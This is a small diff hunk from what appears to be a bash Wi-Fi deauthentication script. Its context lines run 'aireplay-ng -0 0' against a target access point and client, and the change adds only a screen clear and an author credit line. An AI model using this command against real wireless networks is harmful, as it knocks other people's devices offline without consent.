@@ -34,3 +34,7 @@ echo "Deauthing target, press CTRL C to stop attack..."
 sleep 3
 
 sudo aireplay-ng -0 0 -a $ssid -c $targ $1
+
+clear
+
+echo "Created by https://github.com/mcgregol"
